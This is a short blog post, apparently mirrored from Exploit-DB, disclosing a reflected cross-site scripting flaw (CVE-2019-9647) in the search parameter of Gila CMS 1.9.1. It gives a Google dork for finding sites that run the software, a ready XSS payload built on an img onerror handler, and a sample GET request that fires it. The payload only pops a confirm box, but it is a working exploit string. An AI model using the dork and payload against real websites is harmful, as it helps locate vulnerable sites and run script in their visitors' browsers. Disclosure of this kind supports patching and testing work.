---
layout:     post
title:      "Gila CMS 1.9.1 - Cross-Site Scripting"
date:       2019-03-19 12:34
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [xss, cross site scripting, exploit-db]
---

# Exploit Title: Gila CMS (search) Cross Site Scripting
# Google Dork: intext:"Powered By Gila CMS"
# Date: 11.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://gilacms.com
# Software Link: https://gilacms.com/packages/downloadRelease/1.9.1.zip
# Demo Site: https://gilacms.com/demo/
# Version: 1.9.1
# Tested on: Kali Linux
# CVE: CVE-2019-9647

# Vulnerable Parameter: search

# Payload: <--`<img/src=` onerror=confirm``> --!>

# GET Request: http://localhost/?search=<--`<img/src=` onerror=confirm``> --!>
